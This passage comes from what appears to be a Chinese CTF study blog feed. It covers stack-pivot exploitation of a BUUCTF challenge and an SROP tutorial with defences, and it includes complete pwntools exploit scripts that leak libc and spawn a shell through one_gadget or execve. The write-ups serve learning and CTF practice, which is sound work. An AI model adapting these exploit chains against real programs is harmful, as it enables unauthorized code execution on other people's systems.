0LL)，从而导致程序崩溃。</p><p>因此在这里我们的思路是利用ret指令，把构造的payload的存入稍微高点的地址空间，这样即使执行了puts函数开辟了栈帧，也依旧没有干扰到0x601060所存放的stdout指针。</p><p>继续说这个思路遇见的问题，因为要利用ret指令往下迁移来进行“栈”的布局，但是用多少个ret往下滑，这个只能去一次一次试。发现至少填充20个ret就可以把&quot;栈&quot;迁移到一个不会影响程序运行的地方。也就是说我们只要第二次先输入20个ret，然后正常的写一个pop_rdi的指令，然后是puts的got地址，接着就填写puts的plt地址，最后把返回地址填写成main函数。这样就泄露出来了libc_base，然后找到libc版本（打本地和远程找libc版本是方法是不一样的）我这里说下远程的libc版本怎么找，看网上师傅们说是泄露函数地址的后三位，然后上网站上搜索libc版本，可是我试了下不行（不知道是哪出了问题），然后有位师傅告诉我他是这么找的。</p><p><img src="../img/2706180-20220206163407809-1014058819.png" alt=""></p><p>发现这是ubuntu16，然后去BUUCTF上找资源（因为我这个是在BUUCTF上做的），发现资源如下</p><p><img src="../img/2706180-20220206163434246-1049956071.png" alt=""></p><p>然后点一下这个64bit的这个libc，下载即可。</p><p>最后用one_gadget来搜索这个libc的库，去找到获取shell的语句地址。</p><p><img src="../img/2706180-20220206163445744-69836766.png" alt=""></p><p>这个constraints下面的就是这个execve执行的条件(至于哪个地址能满足这个条件，一个一个试试就行），然后上面就是对应的地址，最后我们要用这个地址去加上libc_base，得到真正的one_gadget地址。接着返回到main函数再来一遍，这回第一次输入的时候，我们直接把这个one_gadget给放入返回地址即可。最后要注意的就是因为返回到main函数之后，是有两个read的，尽管我们在第一个read就覆盖了返回地址，但是还是要把第二个read给发送一个内容，才可以结束main函数，因此我在最后一个read发送了一个’1’。</p><p>这个思路其实还有一种变形，就是在第一次read的时候，把rbp直接填充成我们要迁移之后的地址（这个地址是要保证执行puts函数也不会干扰到程序的正常数据），然后第二次输入只需要把迁移后的地址之前全部填充成垃圾数据，然后构造payload，等到迁移之后，直接迁移到了构造的payload的这里，效果和变形之前的思路是一样的）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25199</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_ret_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_addr=<span class="number">0x4004c9</span></span><br><span class="line">main_addr=<span class="number">0x400626</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(level_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">payload2=p64(ret_addr)*<span class="number">20</span> <span class="comment">#这里ret最少是20个，也可以多一点</span></span><br><span class="line">payload2+=p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">shell=libc_base+<span class="number">0x4526a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shell))</span><br><span class="line">payload3=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xdeadbeef</span>)+p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;u want\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>###打本地的wp</p><p><img src="../img/2706180-20220206163044818-1824898636.png" alt=""><br><img src="../img/2706180-20220206163110657-718675687.png" alt=""></p><p>主程序很简单，也发现了溢出点在第一次输入上，read读入buf的时候，可以溢出16个字节，也就是溢出两个内存单元的内容。</p><p><img src="../img/2706180-20220206163137949-2023688181.png" alt=""></p><p>可以发现，我们仅仅能控制rbp和返回地址。并且第二次输入的bank，输入到了bss段</p><p><img src="../img/2706180-20220206163202729-1115577905.png" alt=""></p><p>那我们就可以考虑栈迁移，把需要构造的payload转移到bss段。同时也没有发现后门函数和/bin/sh参数。</p><p>我们先说一下正常的思路。之前讲过了栈迁移的原理，因此我们第一次的read肯定是前面填充垃圾数据，然后把rbp填充成我们要迁移的地址，然后返回地址写一个level;ret指令的地址。然后第二次输入到bss段去构造我们的payload。<strong>因为我们没有后门函数，那只能去泄露一个函数地址，然后去动态库里面找后门函数，接着把返回地址填写成main函数的地址，然后再来一次栈迁移，去构造获取shell的payload。</strong></p><p>但是这道题有好几个地方需要去注意。首先是我们看一下写入bss段地址。</p><p><img src="../img/2706180-20220206163247051-126352913.png" alt=""></p><p><img src="../img/2706180-20220206163309124-364277226.png" alt=""></p><p>发现了got表离这个bss段地址是很近的，因为我们要把栈迁移到bss段，就是可以把这个bss段给看成栈了，我们会在这个“栈”里面调用puts函数去泄露函数地址，但是调用puts的时候会开辟新的栈帧从而改变地址较低处的内容，导致程序崩溃。</p><p>因此在这里我们不去返回到main函数，直接返回到read函数，这样就不会执行setbuf。</p><p>首先的第一个问题就是栈迁移之后，去执行puts函数，puts函数开辟的栈帧会去影响前面的got表中的内容，因此修改rbp时，我们把迁移的地址写的高一点，这样跳转执行的时候，就不会干扰低地址的数据。</p><p>由于这是64位程序，我们要想执行read，需要去找gadget进行传参。可是搜索之后才发现我们没有能控制rdx和rsi的指令，这也就是说我们如果想找gadget的话，执行read函数，连输入的地址都控制不了，因此这里采用ret2csu。</p><p><img src="../img/2706180-20220206164556714-917859079.png" alt=""></p><p>（关于这个ret2csu的细节，在另一篇博客上说明，这里只介绍大致思路），然后执行了read函数之后，直接把read返回地址填写one_gadget地址即可获取shell。在执行read之前先执行puts去泄露puts的got地址，然后把puts的返回地址进行ret2csu去执行read函数。执行完puts的时候要记得给接收了，然后我们要去拿到libc基址，只需要用puts的真实地址去减libc库中的puts地址即可。用ldd去看下程序所依赖的动态库。</p><p><img src="../img/2706180-20220206164604873-25607843.png" alt=""></p><p>获取了动态库的版本之后，就可以得到libc基址，然后再用one_gadget去搜索可以获取shell的one_gadget。</p><p><img src="../img/2706180-20220206164614769-1489437904.png" alt=""></p><p>至于哪个能用，一个一个试一下就行了。最后用one_gadget加上libc基址就是能够获取shell的地址，我们把这个指令的地址放到read的返回地址即可获取shell。至于怎么知道read的返回地址，这里有点讲究。</p><p>因为我们这里直接call read的got地址了，因此执行call的时候，会把下一条指令去当做返回地址，也就是0x4006ed<br><img src="../img/2706180-20220206164714236-513385521.png" alt=""><br>（用ida也可以看出来） 又因为返回地址一定会被存到栈里面（这时候在执行read函数之前 用gdb看一下栈 看看哪个地址里面指向的是0x4006ed)</p><p>然后就去将read函数输入内容的地址 设置成那个栈的地址即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#call函数为跳转到某地址内所保存的地址，应该使用got表中的地址</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#这里多加0x40的目的就是为了执行puts的时候，不影响之前的got表中的数据</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#这一个4006E0仅仅是ret2csu执行了pop之后的ret的返回的地址。</span></span><br><span class="line"><span class="comment">#至于怎么返回到one_gadget上的，是因为read的返回地址被read自己给改了</span></span><br><span class="line"><span class="comment">#payload2中的第一个p64(0)是去占个地方，因为栈迁移本身的特性，迁移后的第一个内存单元不执行</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #只要是发送地址 就要经过打包之后发送</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1>6、附录</h1><p>找leave;ret指令地址，只要在IDA里的代码段随便找到有leave ret出现的地方，取leave的地址即可</p><p><img src="../img/2706180-20220118122656393-1019618142.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SROP的学习总结</title>
      <link href="/posts/e734c492.html"/>
      <url>/posts/e734c492.html</url>
      
        <content type="html"><![CDATA[<p>这个SROP是一种极其有趣的攻击方式，它是利用程序从内核层面切换到用户层面恢复上下文时的一个漏洞，该漏洞可以让我们自己自行设置所有寄存器里的值。</p><p>在这之前我们要先去了解一下系统调用，因为这个漏洞就是在用户态和内核态切换发生的，提到系统调用，这里还要简单介绍一下用户态和内核态的相关知识。</p><h1>什么是用户态和内核态？</h1><h2 id="用户态：">用户态：</h2><p>CPU只能访问受限制的内存，并且不允许访问外围设备（就是不允许直接跟硬件产生关系）。此时的CPU不允许被独占，这就意味着此时的CPU可以被别的进程抢占。</p><h2 id="内核态：">内核态：</h2><p>此时的CPU可以访问任何数据，包括外围设备，比如网卡，硬盘等等。并且此时的CPU可以从一个程序切换到另外一个程序，并且没有进程能够抢占CPU，因为此时内核态的特权级为0.</p><h1>为什么要区分用户态和内核态？</h1><p>用户态和内核态说到底就是CPU所执行的指令权限不同而划分的，而这样做的目的就是为了保护系统，在CPU的所有指令中，有一些指令是非常危险的，如果错用，将导致整个系统崩溃。比如：清内存、设置时钟等。</p><h1>怎么从用户态切换到内核态？</h1><p>用户态切换到内核态的3种方式：</p><p>a. 系统调用（也是我们接下来要提到的重点）</p><p>这是用户态进程主动要求切换到内核态的一种方式，用户态进程通过系统调用申请使用操作系统提供的服务程序完成工作，比如前例中fork()实际上就是执行了一个创建新进程的系统调用。而系统调用的机制其核心还是使用了操作系统为用户特别开放的一个中断来实现，例如Linux的int 80h中断。</p><p>b. 异常</p><p>当CPU在执行运行在用户态下的程序时，发生了某些事先不可知的异常，这时会触发由当前运行进程切换到处理此异常的内核相关程序中，也就转到了内核态，比如缺页异常。</p><p>c. 外围设备的中断</p><p>当外围设备完成用户请求的操作后，会向CPU发出相应的中断信号，这时CPU会暂停执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换。比如硬盘读写操作完成，系统会切换到硬盘读写的中断处理程序中执行后续操作等。</p><p>这个博主对于用户态切换到内核态总结的很详细清楚，我这里就搬运一下。</p><p>原文链接<a href="https://blog.csdn.net/m0_47221702/article/details/119947155">(25条消息) 什么是用户态和内核态？_glory的博客-CSDN博客_内核态和用户态</a></p><p>这里这个系统调用很重要，它的存在意味着我们想执行一些较高权限的函数就需要经过系统调用来变成内核态从而得以实现函数的调用（例如read,write,open函数等等）。</p><h1>用户态的上下文是怎么被保存的？</h1><p>我们现在考虑一个问题，既然现在程序从用户态变成了内核态去执行系统调用的函数，那么再转变回用户态的时候，我们在用户态时寄存器的值怎么办？因为在内核执行系统调用函数的时候，寄存器的值一定是会发生改变的，可它是怎么保存了我们再用户态的上下文？</p><p>现在当我们要准备系统调用了。</p><p><img src="../img/2706180-20220219203837059-350353018.png" alt=""></p><p>图片转自<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki (ctf-wiki.org)</a></p><p>过程①，内核会向进程发送一个signal（你可以把这个理解为中断信号），意思是接下来该进程被挂起，此刻由内核来接管。</p><p>过程②，内核会保存该进程在用户态的上下文，并且跳到已经注册好的Signal Handler（信号处理器），当这个Signal Handler返回的时候，内核控制去传递了一串user-space code （用户层代码），这里翻译成用户层代码可能不是特别准确，我想表达的意思是，<strong>这就是一串实现函数功能的代码并且处于在了用户层</strong>，并且这部分代码被称作signal trampoline。</p><p>过程③，它是在执行signal trampoline的过程。</p><p>过程④，内核将恢复之前保存的上下文，并且最后恢复进程的执行。</p><p>这是大体流程，接下来我们看一下保存上下文的细节。</p><p><strong>在第二步的时候，内核就会将我们的所有寄存器压栈，同时还会把signal信息以及rt_sigreturn压栈。这个ret_sigreturn是一个地址，这个地址指向了sigreturn的这个系统调用（这个系统调用时SROP利用的核心）</strong></p><p><img src="../img/2706180-20220219203845839-1367800712.png" alt=""></p><p>完成上述压栈之后，此时的栈布局是这样的，这段内存也被称为Signal Frame。</p><p>到了过程④的时候，此时的signal trampoline的执行已经到了最后的ret，此时的栈顶就是rt_sigreturn,因此又执行了re_sigreturn所指向的系统调用sigreturn的地址，<strong>这个系统调用函数的作用就是去把栈中的数据恢复到对应寄存器里面，也就是疯狂pop。</strong></p><p>随着rip的值也被pop了回去，此时的程序的系统调用已经完全完成，程序继续运行。</p><h1>SROP原理</h1><h2 id="理论部分">理论部分</h2><p>上述过程是正常的系统调用流程，而SROP则是利用了上下文保存与恢复的漏洞，如果了解了上述的内容，<strong>其实很明显就会发现有一个问题，在把寄存器压栈之后构造的Signal Frame依然是在用户进程的地址空间的，并且是用户进程可读写的。并且执行sigreturn的时候并没有检查准备恢复的这个Signal Frame是否是之前保存的Signal Frame</strong>。</p><p>这就给了我们可乘之机，我们可以去伪造一个Signal Frame然后直接执行sigreturn系统调用。</p><p>先看下正常的系统调用过程（主要看下保存与恢复上下文））<font color=red>（下面两个图，当时制作的时候理解的不太对，应该是执行signal trampoline,而并非是执行signal handler，这里要注意一下</font></p><p><img src="../img/2706180-20220219203856864-84934145.png" alt=""></p><p>接下来看看如果我们系统调用的是sigreturn**(这个sigreturn并<u>不是执行了其他系统调用被动执行的sigreturn</u>，而是<u>我们主动系统</u>调用的就是sigreturn)**</p><p><img src="../img/2706180-20220219203904231-699432548.png" alt=""></p><h2 id="实践部分">实践部分</h2><p>当然上面都是理论知识，我们动态调试看一下是不是这样。</p><p><img src="../img/2706180-20220219203910793-1182638386.png" alt=""></p><p><img src="../img/2706180-20220219203917580-709368108.png" alt=""></p><p>这是<strong>准备系统调用sigreturn之前的寄存器的值</strong>（此时的寄存器是将要被保存的上下文）和栈布局（<strong>此时栈的布局就是为了我们准确控制每一个寄存器的值）</strong></p><p><img src="../img/2706180-20220219203926667-105079808.png" alt=""></p><p>此时是系统调用sigturn之后的寄存器，可以看见参照构造的Signal Frame，精准的改变了每一个寄存器的值（此时execve的系统调用号以及参数全部被布置好了，此时只要执行了syscall就可以获取shell）</p><h2 id="提出一个猜想">提出一个猜想</h2><p>同时我们刚才理论上猜想的是主动执行了sigreturn然后执行execve是不会再让rt_sigreturn触发了（也就是不会再回到执行sigreturn之前了），<strong>那反过来就是说如果我们执行的不是execve，那最后rt_sigreturn还是会触发，也就是即使主动执行了sigreturn控制了我们想要的参数，但是系统调用结束之后，寄存器里还是我们最开始保存的参数，而非主动执行sigreturn布置的参数。</strong></p><h2 id="验证猜想">验证猜想</h2><p>为了验证上面的猜想，我们再用sigreturn来布置参数的时候，布置write（1,‘/bin/sh’,7)这个系统调用，并且使其返回地址为一个_term_proc函数（返回到一个空函数，不对本次实验产生任何影响）</p><p>这个是将要因为执行sigreturn系统调用而被保存的寄存器</p><p><img src="../img/2706180-20220219203934441-61755889.png" alt=""></p><p>这个是执行了sigreturn之后，布置的寄存器，此时还未执行write的系统调用。</p><p><img src="../img/2706180-20220219203941205-1069503757.png" alt=""></p><p>现在是执行write函数之后的寄存器，现在应该会恢复最开始的上下文了吧？</p><p><img src="../img/2706180-20220219203948580-1139524450.png" alt=""></p><p>what???居然没有恢复，和最开始的猜测不一样。</p><p>那我们重新捋一下，看看是哪里出了问题？</p><p>我们利用栈溢出将返回地址设置为实现sigreturn系统调用的gadget，然后再将其后面的栈空间布置成我们想要设置的寄存器的值。待sigreturn系统调用执行完毕，此时的寄存器值，包括RSP/ESP和RIP/EIP都会被改变，可是为什么会这样呀？<strong>sigreturn本身不也是个系统调用么，那执行sigreturn之前的上下文也会被保存，执行sigreturn的时候确实会改变寄存器的值，可是执行sigreturn系统调用之后，原本的上下文不又被恢复了么（但事实是没有恢复）？</strong></p><h2 id="得出正确结论">得出正确结论</h2><p>这里卡了很久，roderick师傅给我的提示去看下sigreturn的官方文档。</p><p><img src="../img/2706180-20220219203956743-74555339.png" alt=""></p><p>果然，在官方文档的简介中就写了cleanup stack frame，这就意味着执行了sigreturn之后的函数栈帧就会被清除掉，当时我还感觉哪里不对，怎么栈（如下图）变成绿绿的了，原来是原本的栈已经都被清除了**（本来清除的应该是Signal Frame,但是由于这是我们主动调用的sigreturn，因此把我们真正的栈给当做Siganal Frame给清除了，因此原本系统调用sigreturn所保存的上下文也在此刻是被清除了，所以我们才没有在系统调用之后得到最开始的上下文）**。<br><img src="../img/2706180-20220219204003370-492577233.png" alt=""></p><h1>总结：</h1><p><strong>用于在内核在恢复上下文的时候并没有与保存的上下文做对比，同时内核在恢复上下文时是从构造的Signal Frame中pop出来各个寄存器的值，而此时的Signal Frame是在栈里的并且用户是可读可写的。这两点疏忽就导致了我们可以伪造Signal Frame之后主动执行sigreturn来控制每个寄存器的值。</strong></p><h1>使用SROP的前提：</h1><p>1、首先程序必须存在溢出，能够控制返回地址。</p><p>2、可以去系统调用sigreturn（如果找不到合适的系统调用号，可以看看能不能利用read函数来控制RAX的值）</p><p>3、必须能够知道/bin/sh的地址，如果写的bss段，直接写地址就行，如果写到栈里，还需要想办法去泄露栈地址。</p><p>4、允许溢出的长度足够长，这样可以去布局我们想要的寄存器的值</p><p>5、需要知道syscall指令的地址</p><h1>补充：一直劫持程序的控制流</h1><p>最后要补充的一点是，前面介绍的方法只能调用一个syscall，然后我们就失去了对执行流的控制了，这里我们其实是可以一直劫持程序的控制流的。</p><p><img src="../img/2706180-20220219204011362-2119817764.png" alt=""></p><p>图片出自<a href="https://blog.csdn.net/zsj2102/article/details/78561112?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-78561112.pc_agg_new_rank&amp;utm_term=sigreturn+%E5%87%BD%E6%95%B0&amp;spm=1000.2123.3001.4430">(25条消息) Sigreturn Oriented Programming (SROP) Attack攻击原理_zsj2102的专栏-CSDN博客_sigreturn 函数</a></p><p>依据图片我们可以发现，我们每次控制寄存器的时候，都把rsp写成下一个片段的rt_sigreturn的地址，并且rip的地址要指向syscall；ret  一定要后面有ret，不然所有的片段连不起来，到ret的时候，就会去执行rsp执行的地址，因此我们就可以一直劫持程序的控制流。</p><h1>防御手段：</h1><p>最后我们来提一下SROP的防范。从三个角度出发，作者提出了三种方法：</p><p><em><strong>*Gadgets Prevention*</strong></em></p><p>在<code>两个重要的gadgets</code>这章我提到，在当前的几种不同的操作系统中，<code>sigreturn</code>和<code>syscall; ret</code>这两个gadgets非常容易被找到，特别是在<code>vsyscall</code>这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让ASLR等保护机制物尽其用，使得攻击者很难找到这些gadgets。</p><p>当然这种方法并不能从本质上解决SROP的问题。</p><p><em><strong>*Signal Frame Canaries*</strong></em></p><p>这种方法借鉴于<a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries">stack canaries</a>机制，即在<code>Signal Frame</code>的<code>rt_sigreturn</code>字段之前插入一段随机生成的字节，如果发生overflow，则该段字节会被破坏，从而在发生<code>sigreturn</code>之前会被检测到。</p><p>当然，针对stack canaries的攻击也很多，其同样不能从本质上防止SROP的发生。</p><p><em><strong>*Break kernel agnostic*</strong></em></p><p>这就要追溯到SROP的本质问题了，就是内核对Signal的不可知性。如果我们在内核处理<code>sigreturn</code>系统调用的时候判断一下当前的<code>Signal Frame</code>是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。</p><p>我认为这个作者提到的这三个防御手段都非常全面，因此我就直接从这篇博客引用了<a href="https://blog.csdn.net/zsj2102/article/details/78561112?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-78561112.pc_agg_new_rank&amp;utm_term=sigreturn+%E5%87%BD%E6%95%B0&amp;spm=1000.2123.3001.4430">(25条消息) Sigreturn Oriented Programming (SROP) Attack攻击原理_zsj2102的专栏-CSDN博客_sigreturn 函数</a></p><h1>实战SROP</h1><h2 id="360chunqiu2017-smallest">360chunqiu2017_smallest</h2><p><img src="../img/2706180-20220220190258944-2045243642.png" alt=""></p><p>可以发现这个程序只有唯一个函数，就是这个start函数（看网上的师傅说这是因为出题人用汇编写的这个程序，编译之后也不需要与库链接）。</p><p>这就是一个read系统调用，然后就没有能利用的地方了，其实看到这个唯一的系统调用就应该往SROP的方向去想了，因为别的很多方法都不可能靠这个一个start函数完成，但是<strong>只要允许输入的长度够长，同时还有read的系统调用就可以考虑使用SROP（因为系统调用read就意味着肯定会有syscall，同时由于read返回值的特性，我们是可以控制rax的值，这也就有机会系统调用sigreturn）</strong></p><p>现在其实最大的问题是怎么去泄露栈的地址？我们可以第一次read读入一个字符，去让系统调用号变成1，但是这就意味着我们无法控制返回地址。这里用了已经很巧妙的方法，由于每一次输入都是从栈顶开始存入数据，如果我们第一次<strong>连续输入了两个start的首地址</strong>（但事实上这里是要输入三个start的地址，不过现在我们先不讨论第三个start的作用），然后**执行了ret，此时第一个start的地址就被pop出来了，也就是说现在栈顶只有一个start地址了，同时我们现在又到了系统调用read这里，然后我们只写一个字节\xB3,这样start的地址0x4000B0就被修改成了0x4000B3，**这样使得我们的RAX里面现在的值就是1了，同时下一次返回的时候跳过了第一个指令xor rax,rax，直接从mov edx,0x400指令开始，最终实现系统调用write，从而实现栈地址泄露。（可以看见下图的左侧栈顶是0x4000b0而执行了read之后，右侧的栈顶已经是0x4000b3了）</p><p><img src="../img/2706180-20220220190308888-853157541.png" alt=""></p><p>不过紧接着遇见的问题就是会发现由于只有一个函数的原因，栈底直接就是环境变量了，因此泄露出来的全都是环境变量（如下图）。</p><p><img src="../img/2706180-20220220190316234-993019298.png" alt=""><br>而环境变量中没有任何一个内存单元指向栈地址，因此我们没法用具体的偏移直接计算，不过好消息是，<strong>由于栈地址随机化的地址变化并不是太大，因此我们可以选取一片空的栈区去存放我们的参数和signal frame（通过泄露的地址直接减去一个较大的数据来指向这片栈区)</strong>。</p><p>最后的难点就是我们的system call chains的构建，<strong>由于我们肯定是用一次sigreturn然后控制参数去调用read（因为我们要把参数写入指定的地址），但是由于我们没办法直接系统调用 sigreturn，需要间接的用read函数来控制RAX在系统调用才行，并且还需要一次sigreturn去控制参数调用execve</strong>。</p><p>这里也是用了一个非常巧妙的手法，由于要控制RAX为15，这就意味着我们只能输入15个字节的内容，可是我们还需要去构造signal frame，因此我们分两次完成，第一次输入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame)</span><br></pre></td></tr></table></figure><p>这个start可以让我们再输入一次，而此时把frame给构建到栈里面，这八个a则是负责去占一个位置（如下图）</p><p><img src="../img/2706180-20220220190323742-16754978.png" alt=""></p><p>第二次输入，这样syscall就到了原本八个a占的位置，而七个b则是为了凑齐十五个字节（如下图）。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220220190329950-517103708.png" alt=""></p><p>按照这两次payload就可以实现sigreturn调用了。</p><p>然后就没什么了，最后要注意一下，第二次执行sigreturn的第一个payload顺便把参数给发送过去，然后用我们在系统调用read的那个rsi配合偏移来获取/bin/sh的地址即可。</p><p>最后的exp如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28000)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x4000BE</span></span><br><span class="line">start_addr=<span class="number">0x4000B0</span></span><br><span class="line">payload=p64(start_addr)*<span class="number">3</span></span><br><span class="line"><span class="comment">#第一个start去让第一次正常运行的ret返回到start</span></span><br><span class="line"><span class="comment">#第二个start让\xB3输入进来，此时去改变了栈顶的start，此时它跳过了xor rax,rax，并</span></span><br><span class="line"><span class="comment">#且它的下面还有一个start</span></span><br><span class="line"><span class="comment">#最下面的start是让我们可以再输入frame，一直控制程序执行流</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">&#x27;\xB3&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x2000</span><span class="comment">#减去0x2000，把payload写到该地址</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0x400</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">frame.rsp=target_addr</span><br><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr+<span class="number">0x110</span> <span class="comment">#此时加上0x110才是/bin/sh的地址</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 